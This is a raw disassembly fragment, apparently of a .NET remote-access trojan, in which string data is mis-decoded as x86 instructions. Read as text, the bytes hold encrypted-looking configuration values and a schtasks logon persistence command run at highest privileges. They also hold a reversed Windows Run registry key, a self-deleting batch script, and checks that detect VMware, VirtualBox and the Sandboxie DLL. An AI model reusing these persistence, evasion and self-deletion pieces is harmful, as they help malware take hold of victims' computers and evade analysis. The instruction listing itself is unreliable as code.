  40be10:	00 6a 00             	add    %ch,0x0(%edx)
  40be13:	51                   	push   %ecx
  40be14:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40be1a:	80 b1 54 00 48 00 59 	xorb   $0x59,0x480054(%ecx)
  40be21:	00 59 00             	add    %bl,0x0(%ecx)
  40be24:	50                   	push   %eax
  40be25:	00 69 00             	add    %ch,0x0(%ecx)
  40be28:	61                   	popa
  40be29:	00 45 00             	add    %al,0x0(%ebp)
  40be2c:	75 00                	jne    0x40be2e
  40be2e:	52                   	push   %edx
  40be2f:	00 78 00             	add    %bh,0x0(%eax)
  40be32:	64 00 37             	add    %dh,%fs:(%edi)
  40be35:	00 39                	add    %bh,(%ecx)
  40be37:	00 66 00             	add    %ah,0x0(%esi)
  40be3a:	35 00 46 00 72       	xor    $0x72004600,%eax
  40be3f:	00 76 00             	add    %dh,0x0(%esi)
  40be42:	63 00                	arpl   %eax,(%eax)
  40be44:	4d                   	dec    %ebp
  40be45:	00 56 00             	add    %dl,0x0(%esi)
  40be48:	6a 00                	push   $0x0
  40be4a:	31 00                	xor    %eax,(%eax)
  40be4c:	59                   	pop    %ecx
  40be4d:	00 6d 00             	add    %ch,0x0(%ebp)
  40be50:	55                   	push   %ebp
  40be51:	00 79 00             	add    %bh,0x0(%ecx)
  40be54:	46                   	inc    %esi
  40be55:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40be59:	00 51 00             	add    %dl,0x0(%ecx)
  40be5c:	75 00                	jne    0x40be5e
  40be5e:	39 00                	cmp    %eax,(%eax)
  40be60:	72 00                	jb     0x40be62
  40be62:	4c                   	dec    %esp
  40be63:	00 43 00             	add    %al,0x0(%ebx)
  40be66:	68 00 6c 00 47       	push   $0x47006c00
  40be6b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40be6e:	56                   	push   %esi
  40be6f:	00 6d 00             	add    %ch,0x0(%ebp)
  40be72:	4a                   	dec    %edx
  40be73:	00 33                	add    %dh,(%ebx)
  40be75:	00 33                	add    %dh,(%ebx)
  40be77:	00 39                	add    %bh,(%ecx)
  40be79:	00 36                	add    %dh,(%esi)
  40be7b:	00 4b 00             	add    %cl,0x0(%ebx)
  40be7e:	54                   	push   %esp
  40be7f:	00 33                	add    %dh,(%ebx)
  40be81:	00 53 00             	add    %dl,0x0(%ebx)
  40be84:	31 00                	xor    %eax,(%eax)
  40be86:	68 00 50 00 39       	push   $0x39005000
  40be8b:	00 6d 00             	add    %ch,0x0(%ebp)
  40be8e:	59                   	pop    %ecx
  40be8f:	00 56 00             	add    %dl,0x0(%esi)
  40be92:	51                   	push   %ecx
  40be93:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40be97:	00 34 00             	add    %dh,(%eax,%eax,1)
  40be9a:	33 00                	xor    (%eax),%eax
  40be9c:	66 00 33             	data16 add %dh,(%ebx)
  40be9f:	00 5a 00             	add    %bl,0x0(%edx)
  40bea2:	33 00                	xor    (%eax),%eax
  40bea4:	65 00 64 00 59       	add    %ah,%gs:0x59(%eax,%eax,1)
  40bea9:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40bead:	00 42 00             	add    %al,0x0(%edx)
  40beb0:	32 00                	xor    (%eax),%al
  40beb2:	4f                   	dec    %edi
  40beb3:	00 79 00             	add    %bh,0x0(%ecx)
  40beb6:	34 00                	xor    $0x0,%al
  40beb8:	43                   	inc    %ebx
  40beb9:	00 35 00 43 00 4e    	add    %dh,0x4e004300
  40bebf:	00 36                	add    %dh,(%esi)
  40bec1:	00 72 00             	add    %dh,0x0(%edx)
  40bec4:	54                   	push   %esp
  40bec5:	00 51 00             	add    %dl,0x0(%ecx)
  40bec8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40becd:	80 b1 58 00 4a 00 61 	xorb   $0x61,0x4a0058(%ecx)
  40bed4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bed7:	4c                   	dec    %esp
  40bed8:	00 59 00             	add    %bl,0x0(%ecx)
  40bedb:	53                   	push   %ebx
  40bedc:	00 4d 00             	add    %cl,0x0(%ebp)
  40bedf:	48                   	dec    %eax
  40bee0:	00 49 00             	add    %cl,0x0(%ecx)
  40bee3:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40bee7:	4a                   	dec    %edx
  40bee8:	00 41 00             	add    %al,0x0(%ecx)
  40beeb:	33 00                	xor    (%eax),%eax
  40beed:	4e                   	dec    %esi
  40beee:	00 4e 00             	add    %cl,0x0(%esi)
  40bef1:	72 00                	jb     0x40bef3
  40bef3:	39 00                	cmp    %eax,(%eax)
  40bef5:	72 00                	jb     0x40bef7
  40bef7:	42                   	inc    %edx
  40bef8:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40befc:	00 65 00             	add    %ah,0x0(%ebp)
  40beff:	5a                   	pop    %edx
  40bf00:	00 71 00             	add    %dh,0x0(%ecx)
  40bf03:	55                   	push   %ebp
  40bf04:	00 32                	add    %dh,(%edx)
  40bf06:	00 78 00             	add    %bh,0x0(%eax)
  40bf09:	32 00                	xor    (%eax),%al
  40bf0b:	76 00                	jbe    0x40bf0d
  40bf0d:	63 00                	arpl   %eax,(%eax)
  40bf0f:	35 00 71 00 57       	xor    $0x57007100,%eax
  40bf14:	00 55 00             	add    %dl,0x0(%ebp)
  40bf17:	4e                   	dec    %esi
  40bf18:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40bf1c:	00 52 00             	add    %dl,0x0(%edx)
  40bf1f:	70 00                	jo     0x40bf21
  40bf21:	2f                   	das
  40bf22:	00 51 00             	add    %dl,0x0(%ecx)
  40bf25:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf26:	00 56 00             	add    %dl,0x0(%esi)
  40bf29:	42                   	inc    %edx
  40bf2a:	00 77 00             	add    %dh,0x0(%edi)
  40bf2d:	47                   	inc    %edi
  40bf2e:	00 75 00             	add    %dh,0x0(%ebp)
  40bf31:	33 00                	xor    (%eax),%eax
  40bf33:	7a 00                	jp     0x40bf35
  40bf35:	66 00 47 00          	data16 add %al,0x0(%edi)
  40bf39:	71 00                	jno    0x40bf3b
  40bf3b:	56                   	push   %esi
  40bf3c:	00 42 00             	add    %al,0x0(%edx)
  40bf3f:	68 00 62 00 76       	push   $0x76006200
  40bf44:	00 72 00             	add    %dh,0x0(%edx)
  40bf47:	57                   	push   %edi
  40bf48:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40bf4c:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40bf50:	00 6a 00             	add    %ch,0x0(%edx)
  40bf53:	41                   	inc    %ecx
  40bf54:	00 33                	add    %dh,(%ebx)
  40bf56:	00 43 00             	add    %al,0x0(%ebx)
  40bf59:	51                   	push   %ecx
  40bf5a:	00 30                	add    %dh,(%eax)
  40bf5c:	00 53 00             	add    %dl,0x0(%ebx)
  40bf5f:	6c                   	insb   (%dx),%es:(%edi)
  40bf60:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40bf64:	00 78 00             	add    %bh,0x0(%eax)
  40bf67:	6a 00                	push   $0x0
  40bf69:	6d                   	insl   (%dx),%es:(%edi)
  40bf6a:	00 6e 00             	add    %ch,0x0(%esi)
  40bf6d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf6e:	00 48 00             	add    %cl,0x0(%eax)
  40bf71:	55                   	push   %ebp
  40bf72:	00 2f                	add    %ch,(%edi)
  40bf74:	00 4f 00             	add    %cl,0x0(%edi)
  40bf77:	58                   	pop    %eax
  40bf78:	00 51 00             	add    %dl,0x0(%ecx)
  40bf7b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bf80:	80 b1 63 00 6e 00 56 	xorb   $0x56,0x6e0063(%ecx)
  40bf87:	00 70 00             	add    %dh,0x0(%eax)
  40bf8a:	4d                   	dec    %ebp
  40bf8b:	00 42 00             	add    %al,0x0(%edx)
  40bf8e:	2f                   	das
  40bf8f:	00 33                	add    %dh,(%ebx)
  40bf91:	00 43 00             	add    %al,0x0(%ebx)
  40bf94:	4f                   	dec    %edi
  40bf95:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40bf99:	00 72 00             	add    %dh,0x0(%edx)
  40bf9c:	32 00                	xor    (%eax),%al
  40bf9e:	35 00 41 00 6f       	xor    $0x6f004100,%eax
  40bfa3:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40bfa7:	00 4a 00             	add    %cl,0x0(%edx)
  40bfaa:	30 00                	xor    %al,(%eax)
  40bfac:	6b 00 69             	imul   $0x69,(%eax),%eax
  40bfaf:	00 50 00             	add    %dl,0x0(%eax)
  40bfb2:	6b 00 47             	imul   $0x47,(%eax),%eax
  40bfb5:	00 71 00             	add    %dh,0x0(%ecx)
  40bfb8:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40bfbc:	72 00                	jb     0x40bfbe
  40bfbe:	70 00                	jo     0x40bfc0
  40bfc0:	6b 00 39             	imul   $0x39,(%eax),%eax
  40bfc3:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40bfc7:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40bfcb:	00 49 00             	add    %cl,0x0(%ecx)
  40bfce:	74 00                	je     0x40bfd0
  40bfd0:	54                   	push   %esp
  40bfd1:	00 48 00             	add    %cl,0x0(%eax)
  40bfd4:	62 00                	bound  %eax,(%eax)
  40bfd6:	4f                   	dec    %edi
  40bfd7:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40bfdb:	00 52 00             	add    %dl,0x0(%edx)
  40bfde:	77 00                	ja     0x40bfe0
  40bfe0:	2f                   	das
  40bfe1:	00 68 00             	add    %ch,0x0(%eax)
  40bfe4:	6c                   	insb   (%dx),%es:(%edi)
  40bfe5:	00 45 00             	add    %al,0x0(%ebp)
  40bfe8:	62 00                	bound  %eax,(%eax)
  40bfea:	41                   	inc    %ecx
  40bfeb:	00 61 00             	add    %ah,0x0(%ecx)
  40bfee:	52                   	push   %edx
  40bfef:	00 63 00             	add    %ah,0x0(%ebx)
  40bff2:	5a                   	pop    %edx
  40bff3:	00 77 00             	add    %dh,0x0(%edi)
  40bff6:	50                   	push   %eax
  40bff7:	00 4f 00             	add    %cl,0x0(%edi)
  40bffa:	6a 00                	push   $0x0
  40bffc:	33 00                	xor    (%eax),%eax
  40bffe:	52                   	push   %edx
  40bfff:	00 32                	add    %dh,(%edx)
  40c001:	00 6e 00             	add    %ch,0x0(%esi)
  40c004:	75 00                	jne    0x40c006
  40c006:	2f                   	das
  40c007:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40c00b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40c00f:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40c013:	00 66 00             	add    %ah,0x0(%esi)
  40c016:	67 00 38             	add    %bh,(%bx,%si)
  40c019:	00 77 00             	add    %dh,0x0(%edi)
  40c01c:	37                   	aaa
  40c01d:	00 77 00             	add    %dh,0x0(%edi)
  40c020:	4a                   	dec    %edx
  40c021:	00 73 00             	add    %dh,0x0(%ebx)
  40c024:	45                   	inc    %ebp
  40c025:	00 75 00             	add    %dh,0x0(%ebp)
  40c028:	33 00                	xor    (%eax),%eax
  40c02a:	71 00                	jno    0x40c02c
  40c02c:	51                   	push   %ecx
  40c02d:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40c033:	03 33                	add    (%ebx),%esi
  40c035:	00 00                	add    %al,(%eax)
  40c037:	80 b1 59 00 67 00 4f 	xorb   $0x4f,0x670059(%ecx)
  40c03e:	00 62 00             	add    %ah,0x0(%edx)
  40c041:	67 00 32             	add    %dh,(%bp,%si)
  40c044:	00 4e 00             	add    %cl,0x0(%esi)
  40c047:	79 00                	jns    0x40c049
  40c049:	46                   	inc    %esi
  40c04a:	00 6f 00             	add    %ch,0x0(%edi)
  40c04d:	72 00                	jb     0x40c04f
  40c04f:	41                   	inc    %ecx
  40c050:	00 6e 00             	add    %ch,0x0(%esi)
  40c053:	43                   	inc    %ebx
  40c054:	00 70 00             	add    %dh,0x0(%eax)
  40c057:	57                   	push   %edi
  40c058:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40c05c:	00 5a 00             	add    %bl,0x0(%edx)
  40c05f:	38 00                	cmp    %al,(%eax)
  40c061:	4c                   	dec    %esp
  40c062:	00 4d 00             	add    %cl,0x0(%ebp)
  40c065:	36 00 31             	add    %dh,%ss:(%ecx)
  40c068:	00 41 00             	add    %al,0x0(%ecx)
  40c06b:	4c                   	dec    %esp
  40c06c:	00 55 00             	add    %dl,0x0(%ebp)
  40c06f:	45                   	inc    %ebp
  40c070:	00 73 00             	add    %dh,0x0(%ebx)
  40c073:	2f                   	das
  40c074:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40c078:	00 69 00             	add    %ch,0x0(%ecx)
  40c07b:	52                   	push   %edx
  40c07c:	00 4f 00             	add    %cl,0x0(%edi)
  40c07f:	79 00                	jns    0x40c081
  40c081:	4e                   	dec    %esi
  40c082:	00 35 00 47 00 73    	add    %dh,0x73004700
  40c088:	00 57 00             	add    %dl,0x0(%edi)
  40c08b:	32 00                	xor    (%eax),%al
  40c08d:	61                   	popa
  40c08e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c091:	45                   	inc    %ebp
  40c092:	00 68 00             	add    %ch,0x0(%eax)
  40c095:	68 00 79 00 49       	push   $0x49007900
  40c09a:	00 7a 00             	add    %bh,0x0(%edx)
  40c09d:	49                   	dec    %ecx
  40c09e:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40c0a2:	00 61 00             	add    %ah,0x0(%ecx)
  40c0a5:	53                   	push   %ebx
  40c0a6:	00 7a 00             	add    %bh,0x0(%edx)
  40c0a9:	4e                   	dec    %esi
  40c0aa:	00 63 00             	add    %ah,0x0(%ebx)
  40c0ad:	38 00                	cmp    %al,(%eax)
  40c0af:	77 00                	ja     0x40c0b1
  40c0b1:	39 00                	cmp    %eax,(%eax)
  40c0b3:	76 00                	jbe    0x40c0b5
  40c0b5:	32 00                	xor    (%eax),%al
  40c0b7:	5a                   	pop    %edx
  40c0b8:	00 66 00             	add    %ah,0x0(%esi)
  40c0bb:	46                   	inc    %esi
  40c0bc:	00 66 00             	add    %ah,0x0(%esi)
  40c0bf:	47                   	inc    %edi
  40c0c0:	00 4f 00             	add    %cl,0x0(%edi)
  40c0c3:	57                   	push   %edi
  40c0c4:	00 62 00             	add    %ah,0x0(%edx)
  40c0c7:	53                   	push   %ebx
  40c0c8:	00 31                	add    %dh,(%ecx)
  40c0ca:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c0cd:	39 00                	cmp    %eax,(%eax)
  40c0cf:	50                   	push   %eax
  40c0d0:	00 36                	add    %dh,(%esi)
  40c0d2:	00 71 00             	add    %dh,0x0(%ecx)
  40c0d5:	47                   	inc    %edi
  40c0d6:	00 2f                	add    %ch,(%edi)
  40c0d8:	00 46 00             	add    %al,0x0(%esi)
  40c0db:	6a 00                	push   $0x0
  40c0dd:	2f                   	das
  40c0de:	00 4d 00             	add    %cl,0x0(%ebp)
  40c0e1:	79 00                	jns    0x40c0e3
  40c0e3:	41                   	inc    %ecx
  40c0e4:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40c0ea:	09 6e 00             	or     %ebp,0x0(%esi)
  40c0ed:	75 00                	jne    0x40c0ef
  40c0ef:	6c                   	insb   (%dx),%es:(%edi)
  40c0f0:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c0f4:	01 00                	add    %eax,(%eax)
  40c0f6:	03 3a                	add    (%edx),%edi
  40c0f8:	00 00                	add    %al,(%eax)
  40c0fa:	0d 50 00 61 00       	or     $0x610050,%eax
  40c0ff:	63 00                	arpl   %eax,(%eax)
  40c101:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c104:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c108:	09 50 00             	or     %edx,0x0(%eax)
  40c10b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c111:	00 0f                	add    %cl,(%edi)
  40c113:	4d                   	dec    %ebp
  40c114:	00 65 00             	add    %ah,0x0(%ebp)
  40c117:	73 00                	jae    0x40c119
  40c119:	73 00                	jae    0x40c11b
  40c11b:	61                   	popa
  40c11c:	00 67 00             	add    %ah,0x0(%edi)
  40c11f:	65 00 00             	add    %al,%gs:(%eax)
  40c122:	07                   	pop    %es
  40c123:	63 00                	arpl   %eax,(%eax)
  40c125:	6d                   	insl   (%dx),%es:(%edi)
  40c126:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c12a:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c130:	00 73 00             	add    %dh,0x0(%ebx)
  40c133:	63 00                	arpl   %eax,(%eax)
  40c135:	68 00 74 00 61       	push   $0x61007400
  40c13a:	00 73 00             	add    %dh,0x0(%ebx)
  40c13d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c140:	00 20                	add    %ah,(%eax)
  40c142:	00 2f                	add    %ch,(%edi)
  40c144:	00 63 00             	add    %ah,0x0(%ebx)
  40c147:	72 00                	jb     0x40c149
  40c149:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c14d:	74 00                	je     0x40c14f
  40c14f:	65 00 20             	add    %ah,%gs:(%eax)
  40c152:	00 2f                	add    %ch,(%edi)
  40c154:	00 66 00             	add    %ah,0x0(%esi)
  40c157:	20 00                	and    %al,(%eax)
  40c159:	2f                   	das
  40c15a:	00 73 00             	add    %dh,0x0(%ebx)
  40c15d:	63 00                	arpl   %eax,(%eax)
  40c15f:	20 00                	and    %al,(%eax)
  40c161:	6f                   	outsl  %ds:(%esi),(%dx)
  40c162:	00 6e 00             	add    %ch,0x0(%esi)
  40c165:	6c                   	insb   (%dx),%es:(%edi)
  40c166:	00 6f 00             	add    %ch,0x0(%edi)
  40c169:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c16d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c16e:	00 20                	add    %ah,(%eax)
  40c170:	00 2f                	add    %ch,(%edi)
  40c172:	00 72 00             	add    %dh,0x0(%edx)
  40c175:	6c                   	insb   (%dx),%es:(%edi)
  40c176:	00 20                	add    %ah,(%eax)
  40c178:	00 68 00             	add    %ch,0x0(%eax)
  40c17b:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c181:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c185:	74 00                	je     0x40c187
  40c187:	20 00                	and    %al,(%eax)
  40c189:	2f                   	das
  40c18a:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c18e:	00 20                	add    %ah,(%eax)
  40c190:	00 22                	add    %ah,(%edx)
  40c192:	00 00                	add    %al,(%eax)
  40c194:	11 22                	adc    %esp,(%edx)
  40c196:	00 20                	add    %ah,(%eax)
  40c198:	00 2f                	add    %ch,(%edi)
  40c19a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c19e:	00 20                	add    %ah,(%eax)
  40c1a0:	00 27                	add    %ah,(%edi)
  40c1a2:	00 22                	add    %ah,(%edx)
  40c1a4:	00 01                	add    %al,(%ecx)
  40c1a6:	13 22                	adc    (%edx),%esp
  40c1a8:	00 27                	add    %ah,(%edi)
  40c1aa:	00 20                	add    %ah,(%eax)
  40c1ac:	00 26                	add    %ah,(%esi)
  40c1ae:	00 20                	add    %ah,(%eax)
  40c1b0:	00 65 00             	add    %ah,0x0(%ebp)
  40c1b3:	78 00                	js     0x40c1b5
  40c1b5:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1bb:	5c                   	pop    %esp
  40c1bc:	00 6e 00             	add    %ch,0x0(%esi)
  40c1bf:	75 00                	jne    0x40c1c1
  40c1c1:	52                   	push   %edx
  40c1c2:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c1c6:	00 6f 00             	add    %ch,0x0(%edi)
  40c1c9:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1cf:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1d3:	74 00                	je     0x40c1d5
  40c1d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1d6:	00 65 00             	add    %ah,0x0(%ebp)
  40c1d9:	72 00                	jb     0x40c1db
  40c1db:	72 00                	jb     0x40c1dd
  40c1dd:	75 00                	jne    0x40c1df
  40c1df:	43                   	inc    %ebx
  40c1e0:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c1e4:	00 77 00             	add    %dh,0x0(%edi)
  40c1e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1e8:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c1ec:	00 69 00             	add    %ch,0x0(%ecx)
  40c1ef:	57                   	push   %edi
  40c1f0:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c1f4:	00 66 00             	add    %ah,0x0(%esi)
  40c1f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1f8:	00 73 00             	add    %dh,0x0(%ebx)
  40c1fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1fc:	00 72 00             	add    %dh,0x0(%edx)
  40c1ff:	63 00                	arpl   %eax,(%eax)
  40c201:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c207:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c20b:	61                   	popa
  40c20c:	00 77 00             	add    %dh,0x0(%edi)
  40c20f:	74 00                	je     0x40c211
  40c211:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c215:	53                   	push   %ebx
  40c216:	00 00                	add    %al,(%eax)
  40c218:	03 22                	add    (%edx),%esp
  40c21a:	00 00                	add    %al,(%eax)
  40c21c:	09 2e                	or     %ebp,(%esi)
  40c21e:	00 62 00             	add    %ah,0x0(%edx)
  40c221:	61                   	popa
  40c222:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c226:	13 40 00             	adc    0x0(%eax),%eax
  40c229:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c22d:	68 00 6f 00 20       	push   $0x20006f00
  40c232:	00 6f 00             	add    %ch,0x0(%edi)
  40c235:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c239:	00 1f                	add    %bl,(%edi)
  40c23b:	74 00                	je     0x40c23d
  40c23d:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c243:	6f                   	outsl  %ds:(%esi),(%dx)
  40c244:	00 75 00             	add    %dh,0x0(%ebp)
  40c247:	74 00                	je     0x40c249
  40c249:	20 00                	and    %al,(%eax)
  40c24b:	33 00                	xor    (%eax),%eax
  40c24d:	20 00                	and    %al,(%eax)
  40c24f:	3e 00 20             	add    %ah,%ds:(%eax)
  40c252:	00 4e 00             	add    %cl,0x0(%esi)
  40c255:	55                   	push   %ebp
  40c256:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c25a:	15 53 00 54 00       	adc    $0x540053,%eax
  40c25f:	41                   	inc    %ecx
  40c260:	00 52 00             	add    %dl,0x0(%edx)
  40c263:	54                   	push   %esp
  40c264:	00 20                	add    %ah,(%eax)
  40c266:	00 22                	add    %ah,(%edx)
  40c268:	00 22                	add    %ah,(%edx)
  40c26a:	00 20                	add    %ah,(%eax)
  40c26c:	00 22                	add    %ah,(%edx)
  40c26e:	00 00                	add    %al,(%eax)
  40c270:	07                   	pop    %es
  40c271:	43                   	inc    %ebx
  40c272:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c276:	00 00                	add    %al,(%eax)
  40c278:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c27c:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c280:	00 22                	add    %ah,(%edx)
  40c282:	00 00                	add    %al,(%eax)
  40c284:	0f 22 00             	mov    %eax,%cr0
  40c287:	20 00                	and    %al,(%eax)
  40c289:	2f                   	das
  40c28a:	00 66 00             	add    %ah,0x0(%esi)
  40c28d:	20 00                	and    %al,(%eax)
  40c28f:	2f                   	das
  40c290:	00 71 00             	add    %dh,0x0(%ecx)
  40c293:	00 05 78 00 70 00    	add    %al,0x700078
  40c299:	00 45 53             	add    %al,0x53(%ebp)
  40c29c:	00 65 00             	add    %ah,0x0(%ebp)
  40c29f:	6c                   	insb   (%dx),%es:(%edi)
  40c2a0:	00 65 00             	add    %ah,0x0(%ebp)
  40c2a3:	63 00                	arpl   %eax,(%eax)
  40c2a5:	74 00                	je     0x40c2a7
  40c2a7:	20 00                	and    %al,(%eax)
  40c2a9:	2a 00                	sub    (%eax),%al
  40c2ab:	20 00                	and    %al,(%eax)
  40c2ad:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c2b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2b2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2b5:	20 00                	and    %al,(%eax)
  40c2b7:	57                   	push   %edi
  40c2b8:	00 69 00             	add    %ch,0x0(%ecx)
  40c2bb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2bc:	00 33                	add    %dh,(%ebx)
  40c2be:	00 32                	add    %dh,(%edx)
  40c2c0:	00 5f 00             	add    %bl,0x0(%edi)
  40c2c3:	43                   	inc    %ebx
  40c2c4:	00 6f 00             	add    %ch,0x0(%edi)
  40c2c7:	6d                   	insl   (%dx),%es:(%edi)
  40c2c8:	00 70 00             	add    %dh,0x0(%eax)
  40c2cb:	75 00                	jne    0x40c2cd
  40c2cd:	74 00                	je     0x40c2cf
  40c2cf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2d3:	53                   	push   %ebx
  40c2d4:	00 79 00             	add    %bh,0x0(%ecx)
  40c2d7:	73 00                	jae    0x40c2d9
  40c2d9:	74 00                	je     0x40c2db
  40c2db:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2df:	00 19                	add    %bl,(%ecx)
  40c2e1:	4d                   	dec    %ebp
  40c2e2:	00 61 00             	add    %ah,0x0(%ecx)
  40c2e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2e6:	00 75 00             	add    %dh,0x0(%ebp)
  40c2e9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c2ed:	63 00                	arpl   %eax,(%eax)
  40c2ef:	74 00                	je     0x40c2f1
  40c2f1:	75 00                	jne    0x40c2f3
  40c2f3:	72 00                	jb     0x40c2f5
  40c2f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2f9:	00 2b                	add    %ch,(%ebx)
  40c2fb:	6d                   	insl   (%dx),%es:(%edi)
  40c2fc:	00 69 00             	add    %ch,0x0(%ecx)
  40c2ff:	63 00                	arpl   %eax,(%eax)
  40c301:	72 00                	jb     0x40c303
  40c303:	6f                   	outsl  %ds:(%esi),(%dx)
  40c304:	00 73 00             	add    %dh,0x0(%ebx)
  40c307:	6f                   	outsl  %ds:(%esi),(%dx)
  40c308:	00 66 00             	add    %ah,0x0(%esi)
  40c30b:	74 00                	je     0x40c30d
  40c30d:	20 00                	and    %al,(%eax)
  40c30f:	63 00                	arpl   %eax,(%eax)
  40c311:	6f                   	outsl  %ds:(%esi),(%dx)
  40c312:	00 72 00             	add    %dh,0x0(%edx)
  40c315:	70 00                	jo     0x40c317
  40c317:	6f                   	outsl  %ds:(%esi),(%dx)
  40c318:	00 72 00             	add    %dh,0x0(%edx)
  40c31b:	61                   	popa
  40c31c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c320:	00 6f 00             	add    %ch,0x0(%edi)
  40c323:	6e                   	outsb  %ds:(%esi),(%dx)
  40c324:	00 00                	add    %al,(%eax)
  40c326:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c329:	6f                   	outsl  %ds:(%esi),(%dx)
  40c32a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c32e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c332:	0f 56 00             	orps   (%eax),%xmm0
  40c335:	49                   	dec    %ecx
  40c336:	00 52 00             	add    %dl,0x0(%edx)
  40c339:	54                   	push   %esp
  40c33a:	00 55 00             	add    %dl,0x0(%ebp)
  40c33d:	41                   	inc    %ecx
  40c33e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c342:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c347:	77 00                	ja     0x40c349
  40c349:	61                   	popa
  40c34a:	00 72 00             	add    %dh,0x0(%edx)
  40c34d:	65 00 00             	add    %al,%gs:(%eax)
  40c350:	15 56 00 69 00       	adc    $0x690056,%eax
  40c355:	72 00                	jb     0x40c357
  40c357:	74 00                	je     0x40c359
  40c359:	75 00                	jne    0x40c35b
  40c35b:	61                   	popa
  40c35c:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c360:	00 6f 00             	add    %ch,0x0(%edi)
  40c363:	78 00                	js     0x40c365
  40c365:	00 17                	add    %dl,(%edi)
  40c367:	53                   	push   %ebx
  40c368:	00 62 00             	add    %ah,0x0(%edx)
  40c36b:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c371:	6c                   	insb   (%dx),%es:(%edi)
  40c372:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c376:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c37a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c37e:	11 45 00             	adc    %eax,0x0(%ebp)
  40c381:	72 00                	jb     0x40c383
  40c383:	72 00                	jb     0x40c385
  40c385:	20 00                	and    %al,(%eax)
  40c387:	48                   	dec    %eax
